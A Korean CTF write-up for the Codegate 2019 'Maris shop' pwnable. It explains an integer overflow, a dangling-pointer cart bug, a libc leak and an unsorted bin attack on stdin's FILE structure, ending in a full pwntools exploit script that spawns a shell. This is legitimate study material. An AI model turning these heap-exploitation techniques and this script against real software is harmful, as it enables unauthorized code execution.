---
layout: post
cover: 'assets/images/cover8.jpg'
navigation: true
title: Codegate2019 - Maris shop
date: 2019-03-09
tags: pwnable codegate writeup
subclass: 'post'
logo: 'assets/images/ghost.png'
author: lanphere
categories: lanphere
disqus: true
---

```
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial
```
PIE가 걸려있고 RELRO는 Partial이다.
```
void __cdecl item_init()
{
  signed int i; // [rsp+Ch] [rbp-4h]

  puts("Welcome to Mari's Shop!");
  puts("Choose item and Add to your cart");
  puts("Enjoy Shopping!!");
  crystal_num = 100;
  for ( i = 0; i <= 29; ++i )
  {
    whole_items[i] = malloc(0x90uLL);
    strncpy(&whole_items[i]->name, item_pools[i], 0x80uLL);
    whole_items[i]->price = item_pools_price[i];
  }
}
```
처음에 아이템 풀로부터 whole_items라는 배열을 초기화하고 시작한다.
whole_items는 구조체 포인터의 배열이다.
```
struct item {
  unsigned int price;
  unsigned int dummy;
  int64 amount;
  char name[128];
}
```

```
if ( (signed int)(cart[idx]->price * (unsigned __int64)cart[idx]->amount) > crystal_num )
{
  puts("You don't have enough money!");
  return;
}
crystal_num -= cart[idx]->price * (unsigned __int64)cart[idx]->amount;
free(cart[idx]);
for ( i = idx; i <= 0xE && cart[i + 1]; ++i )
  cart[i] = cart[i + 1];
  cart[i] = 0LL;
```
여기서 `cart[idx]->price`와 `cart[idx]->amount`는 둘 다 unsigned인데 둘을 곱하고 signed형으로 캐스팅을 한다.<br>
만약 저 둘을 곱한 게 0x7fffffff보다 크면 signed로 바뀌면서 음수가 되어 if문을 통과하고,<br>
`crystal_num -= cart[idx]->price * (unsigned __int64)cart[idx]->amount;`
에서 언더플로우를 유발해서 crystal_num을 크게 만들 수 있다.
```
puts("Do you want to clear your cart?");
puts("1. Yes");
puts("2. No");
printf("Your choice:");
v3 = 0;
if ( (unsigned int)get_number() == 1 )
{
  while ( cart[v3] )
    free(cart[v3++]);
}
else
{
  puts("Sorry, you must clear your cart");
}
for ( k = 0; k <= 0xE; ++k )
  cart[k] = 0LL;
```
cart는 17개의 포인터를 저장하는 배열이다. 그런데 맨 아래 for문에 보면 15개의 포인터만 0으로 초기화한다. 따라서
16개의 포인터를 만든 후 free시키면 16번째 포인터는(free된) 배열에 남아있게 된다. 따라서 libc leak을 할 수 있을 것이다.

라고 생각을 했지만 free함수 routine 중 free하려는 chunk의 다음 chunk가 top chunk이면 top chunk와 merge해버리는 부분이 있어서
free된 chunk가 unsorted bin에 들어가지 않았다. 즉 leak을 할 수 없었다.

여기서 조금 생각을 하다가 카트에 추가한 item을 buy하면 free를 하고 메모리에 있는 포인터를 초기화하지만, 메뉴에 있는 remove의 경우 free를 하지 않고 포인터만 초기화시킨다.

```
void __cdecl remove_from_cart()
{
  unsigned int i; // [rsp+8h] [rbp-8h]
  unsigned int idx; // [rsp+Ch] [rbp-4h]

  printf("Which item?:");
  idx = get_number();
  if ( idx <= 0xF )
  {
    if ( cart[idx] )
    {
      for ( i = idx; i <= 0xE && cart[i + 1]; ++i )
        cart[i] = cart[i + 1];
      cart[i] = 0LL;
    }
    else
    {
      puts("No such item!");
    }
  }
  else
  {
    puts("No such item!");
  }
}
```

이걸 이용해서 dummy chunk를 만들어 적당히 조작하니 libc leak을 할 수 있었다.
그 다음에는 unsorted bin attack을 해야한다. unsorted bin attack을 하려면 unsorted bin에 들어가 있는 chunk의 bk를 임의의 값으로 쓸 수 있어야 한다. Unsorted chunk야 libc leak을 하는 데 썼던 chunk와 그 포인터가 있으니 문제가 없는데 어떻게 값을 쓸 수 있을까? add함수에 답이 있다.

```
for (i = 0; i <= 0xF; ++i) {
  if (cart[i] && !strcmp(&cart[i]->name, &items[item_num - 1]->name)) {
    printf("Add more?:");
    cart[i]->amount += get_number();
    puts("Done!");
    return;
  }
}
```

추가하려는 item의 index를 입력받고 나면 모든 카트에 대해 선택한 아이템과 카트에 있는 아이템의 이름을 비교한다.
그 카트의 메모리가 free가 됐는 지 아닌 지는 확인하지 않는다. 아까 leak을 할 때 free한 unsorted chunk의 이름은 그대로 남아 있고,
위 코드에서 조작할 수 있는 값이 `cart[i]->amount`인데 이 변수가 chunk에서 bk 위치에 있기 때문에 이를 이용하면 된다. unsorted bin attack을 이용해서 stdin 구조체의 _IO_buf_end 포인터 값에 main_arena + 88를 overwrite하면 fgets함수에서 입력을 받을 때 stdin구조체의 여러 변수를 overwrite할 수 있어서 결국엔 one_gadget을 호출할 수 있다.

```
from pwn import *

stdin_buf_end_offset = 0x3c4920
vtable_offset = 0x3c36e0
one_gadget_offset = 0xf02a4  # 0x45216 0x4526a 0xf02a4 0xf1147

p = process('./Maris_shop', env={'LD_PRELOAD': './libc.so.6'})


def overflow():
    p.sendlineafter('Your choice:', str(1))
    p.recvuntil('---- ')
    price = int(p.recvuntil('\n', drop=True))
    p.sendlineafter('Which item?:', '1')
    p.sendlineafter('Amount?:', str(0xa0000000 / price))
    p.sendlineafter('Your choice:', '4')
    p.sendlineafter('Your choice:', '1')
    p.sendlineafter('Which item?:', '0')
    p.recvuntil('Done!\n\n')


def unsorted_bin_attack():
    p.sendlineafter('Your choice:', str(1))
    result = p.recvuntil('Which item?:').split('\n')
    del result[0]
    del result[-1]

    for item in result:
        if item_name in item:
            return item[0], result
    return None, result


def is_in_cart(result):
    null_idx = 1

    while True:
        for item in result:
            for item_in_cart in items_in_cart:
                if item_in_cart in item:
                    return null_idx
            null_idx = null_idx + 1
        return None


def add(idx, amount):
    p.sendlineafter('Your choice:', str(1))
    p.sendlineafter('Which item?:', str(idx))
    p.sendlineafter('?:', str(amount))
    p.recvuntil('Done!\n\n')


def remove(idx):
    p.sendlineafter('Your choice:', str(2))
    p.sendlineafter('Which item?:', str(idx))


def buy(idx, buy_all):
    p.sendlineafter('Your choice:', str(4))
    if buy_all:
        p.sendlineafter('Your choice:', str(2))
        p.sendlineafter('Your choice:', str(1))
    else:
        p.sendlineafter('Your choice:', str(1))
        p.sendlineafter('Which item?:', str(idx))
    p.recvuntil('Done!\n\n')


def show(idx, show_all):
    p.sendlineafter('Your choice:', str(3))
    if show_all:
        p.sendlineafter('Your choice:', str(2))
    else:
        p.sendlineafter('Your choice:', str(1))
        p.sendlineafter('Which item?:', str(idx))


# gdb.attach(p, '')

# Increase the number of crystals by integer overflow
overflow()

# add 16 items and buy all
while True:
    add(1, 1)
    show(0, True)
    result = p.recvuntil('You', drop=True).split('\n')
    del result[0]
    del result[-1]
    del result[-1]
    if len(result) == 16:
        break

buy(0, True)

# make two orphan chunks
while True:
    add(1, 1)
    show(0, True)
    result = p.recvuntil('You', drop=True).split('\n')
    del result[0]
    del result[-1]
    del result[-1]
    if len(result) == 3:
        break

remove(0)
remove(0)

# allocate 15 chunks and Libc leak
while True:
    add(1, 1)
    show(0, True)
    result = p.recvuntil('You', drop=True).split('\n')
    del result[0]
    del result[-1]
    del result[-1]
    if len(result) == 16:
        break

buy(0xd, False)
show(0xe, False)

p.recvuntil('Amount: ')
libc_addr = int(p.recvuntil('\n')[:-1]) - 0x3c4b78

log.info('Libc Addr: ' + hex(libc_addr))
log.info('Arena + 88: ' + hex(libc_addr + 0x3c4b78))
log.info('One_gadget_addr: ' + hex(libc_addr + one_gadget_offset))

# Unsorted bin Attack
show(0, True)
items_in_cart = p.recvuntil('14: ').split('\n')
del items_in_cart[0]
del items_in_cart[-1]

for x in range(len(items_in_cart)):
    if(x < 9):
        items_in_cart[x] = items_in_cart[x][3:]
    else:
        items_in_cart[x] = items_in_cart[x][4:]

item_name = p.recvuntil('\n')[:-1]
log.info('Item name: ' + item_name)
log.info('Diff Offset: ' + hex(stdin_buf_end_offset - 0x3c4b78))

while True:
    idx, result = unsorted_bin_attack()
    if idx is None:
        null_idx = is_in_cart(result)
        if null_idx is None:
            log.info('Error')
        log.info(null_idx)
        p.sendline(str(null_idx))
        p.sendlineafter('?:', str(1))
        p.recvuntil('Done!\n\n')
    else:
        p.sendline(idx)
        p.sendlineafter('Add more?:', str(
            stdin_buf_end_offset - 0x10 - 0x3c4b78))
        p.recvuntil('Done!\n\n')
        break

while True:
    add(1, 1)
    show(0, True)
    result = p.recvuntil('You', drop=True).split('\n')
    del result[0]
    del result[-1]
    del result[-1]
    if len(result) == 16:
        break

payload = '\x00'*5 + p64(libc_addr+0x3c6790)
payload += p64(0xffffffffffffffff) + p64(0x0000000000000000)
payload += p64(libc_addr + 0x3c49c0) + p64(0)*3
payload += p64(0x00000000ffffffff) + p64(0)*2 + p64(libc_addr + 0x3c49c0)
payload += p64(0)*2 + p64(libc_addr + one_gadget_offset)*10
p.sendline(payload)
p.recvuntil('Your choice:')
p.interactive()
```


